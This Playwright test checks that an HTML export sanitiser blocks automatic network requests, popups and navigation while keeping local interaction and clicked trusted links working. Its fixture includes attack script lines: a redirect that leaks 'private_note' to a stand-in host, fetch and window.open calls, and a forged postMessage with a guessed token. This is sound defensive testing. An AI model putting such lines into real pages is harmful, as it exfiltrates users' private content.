import {expect,test,chromium} from '@playwright/test';
import {build} from 'esbuild';
import {mkdir,writeFile} from 'node:fs/promises';
import {dirname} from 'node:path';
import {pathToFileURL} from 'node:url';

test('downloaded HTML blocks automatic network/navigation while preserving local interaction and trusted links',async()=>{
  const browser=await chromium.launch({channel:'chrome',headless:true});
  try{
    const context=await browser.newContext();
    const requests:string[]=[];
    // Every external request is intercepted; this test never contacts a service.
    await context.route(/^https?:/,route=>{requests.push(route.request().url());return route.fulfill({status:200,contentType:'text/html',body:'intercepted'});});
    const page=await context.newPage();
    const bundle=await build({entryPoints:['src/library/document-download.ts'],bundle:true,write:false,format:'iife',globalName:'ExportSecurity'});
    await page.addScriptTag({content:bundle.outputFiles[0].text});
    const html=await page.evaluate(()=>{
      const attack="setTimeout(()=>{location.href='https://audit.invalid/leak?content=private_note';},50);";
      const source=`<!doctype html><html><head><title>安全导出</title></head><body>
        <button id="count">0</button><pre id="proof"></pre>
        <a id="external" href="https://reference.invalid/reading">资料链接</a>
        <button data-vcamp-time="60.25">视频时间点</button>
        <script>
          document.querySelector('#proof').textContent=JSON.stringify({rtc:typeof RTCPeerConnection,worker:typeof Worker});
          document.querySelector('#count').onclick=()=>{document.querySelector('#count').textContent='1';parent.postMessage({type:'vcamp.html.action',token:'guess',kind:'external',url:'https://audit.invalid/forged'},'*');};
          fetch('https://audit.invalid/fetch').catch(()=>{});
          window.open('https://audit.invalid/popup');
          ${attack}
        </script></body></html>`;
      const file={name:'audit.html',type:'html',content:source,source:{videoId:'BVtest',pageNumber:2}};
      return {malicious:(window as any).ExportSecurity.portableHtml(file),interactive:(window as any).ExportSecurity.portableHtml({...file,content:source.replace(attack,'')})};
    });
    const path=test.info().outputPath('sandboxed-export.html');
    await mkdir(dirname(path),{recursive:true});await writeFile(path,html.malicious);
    await page.goto(pathToFileURL(path).href);
    await page.waitForTimeout(250);
    expect(requests).toEqual([]);
    expect(context.pages()).toHaveLength(1);
    expect(page.url()).toBe(pathToFileURL(path).href);
    await writeFile(path,html.interactive);await page.reload();
    const frame=page.frameLocator('iframe');
    await expect(frame.locator('#proof')).toHaveText('{"rtc":"undefined","worker":"undefined"}');
    await frame.locator('#count').click();
    await expect(frame.locator('#count')).toHaveText('1');
    expect(requests).toEqual([]);
    const external=page.waitForEvent('popup');
    await frame.locator('#external').click();
    const externalPage=await external;await externalPage.waitForLoadState();
    expect(externalPage.url()).toBe('https://reference.invalid/reading');
    await externalPage.close();
    // The bridge bounds navigation frequency; use a later independent click.
    await page.waitForTimeout(1050);
    const video=page.waitForEvent('popup');
    await frame.getByRole('button',{name:'视频时间点'}).click();
    const videoPage=await video;await videoPage.waitForLoadState();
    expect(videoPage.url()).toBe('https://www.bilibili.com/video/BVtest/?p=2&autoplay=0&t=60');
    expect(requests).toEqual(['https://reference.invalid/reading','https://www.bilibili.com/video/BVtest/?p=2&autoplay=0&t=60']);
  }finally{await browser.close();}
});
